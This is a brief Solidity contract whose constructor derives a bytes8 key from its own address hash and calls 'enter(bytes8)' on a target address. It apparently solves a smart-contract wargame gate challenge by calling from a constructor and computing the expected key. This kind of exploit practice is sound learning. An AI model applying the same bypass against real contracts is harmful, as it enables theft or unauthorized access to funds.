contract Bro {
    constructor(address _ad) {
        bytes8 key = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
                type(uint64).max
        );

        _ad.call(abi.encodeWithSignature("enter(bytes8)", key));
    }
}
